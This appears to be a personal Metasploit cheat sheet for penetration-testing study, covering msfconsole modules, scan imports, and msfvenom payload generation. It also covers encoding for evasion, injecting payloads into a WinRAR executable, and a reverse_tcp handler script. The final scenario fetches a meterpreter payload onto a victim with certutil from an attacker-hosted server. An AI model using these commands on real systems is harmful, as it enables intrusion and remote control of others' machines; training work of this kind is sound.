# Metasploit Framework

### MSFDB
- sudo systemctl enable postgresql //enacle postgresql on startup
- sudo systemctl start postgresql //start the service
- sudo systemctl status postgresql //check postgresql status
- sudo msfdb //start msfdb
- sudo msfdb init //initialise db

### MSFConsole
- search -h to learn about search options
- Importing nmap scans: `db-import <path of nmap xml output>`
- To perfoem a scan on internal network through the initial victim, run `run autoroute -s <IP>` in meterpreter


### MySQL with MSF
- useful modules: version, schemadum, login, file_enum
- modules under /admin/ will need cred to use: mysql_enum, mysql_sql
- TIP: can use `loot`, and `creds` to see credentials etc

### Nessus with MSF
- Do the scan with nessus and export it in XML `export nessus`
- Load it in with `db_import <location of nessus scan>`
- use the `vulns` command to see possible vulnerabilies

### WMAP (web app) vuln scan with MSF
- Comes with msf so just type: `load wmap` and to see all the commands available we can do `wmap_` and press tab
- To show the current modules being used to scan the target we say: `wmap_run -t`
- use `wmap_vulns -l` to list all vulns after a scan


### MSFVenom
- To get help, we can say: `msfvenom --list <the option you need help>` eg:`msfvenom --list formats`, `msfvenom --list payloads`
- Sample Msfvenom command: `msfvenom -p <payload type> LHOST=<our IP> LPORT=<our port> -f <file format> > <Location of the output>`

### Encoding
- useful encoders are shikata_ga_nai and cmd/powershell_base64
- To list out encoders `msfvenom --list encoders`
- Sample command: `msfvenom -p <payload> LHOST=<IP> LPORT=<IP> -e x86/shikata_ga_nai -f exe > <location>`
- For iteration, we can specify by using `-i 10` or `iterations 10`

### Injecting Payloads into PE (-x, -k)
- sample command: `msfvenom -p <payload> LHOST=<IP> LPORT=<IP> -e x86/shikata_ga_nai -f exe -x <Path to the exe eg: ~/Downloads/wrar602.exe> > <location>`

### MSF Resource Scripts for automation (like bash scripts)
- All resource scripts are located at: /usr/share/metasploit-framework/scripts/resource/ 
- Example of a simple script below:
```handler.rc
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 1234
run
```
- To run the above script use: msfconsole -r handler.rc //-r flag for resource script
- Another example below
```
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.7
run
```
- Another example below
```db_status.rc
db_status
workspace
workspace -a Test
```
- If you are already inside msfconsole, you can load up a resource script by: `resource ~/usr/share/metasploit-framework/scripts/resource/<scriptName>`
- To export a script from inside the console, do your actions, and terminate after typing run, and type:`makerc <$PATH/ScriptName>`

## Exploitation

### HTTP file server
- difference of http file server and typical http server is that it's just use to file share and no other usage
- popular servers include: Rejetto HFS
- Rejetto V2.3 is vuln to RCE attack

**Nice practical situation encountered**
Scenario: when using the tomcat_jsp_upload_bypass module, a cmd was popped in msf, but we want a meterpreter for all the good stuff, so what can we do now? We can 
use `msfvnom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=1234 -f exe > meterpreter.exe` to gen a payload, host a simple python server on our(attacker) 
machine using `sudo python -m SimpleHTTPServer 80` and use the cmd to `certutil -urlcache -f http://<IP>/meterpreter.exe meterpreter.exe, then we can open a handler
and catch the shell.








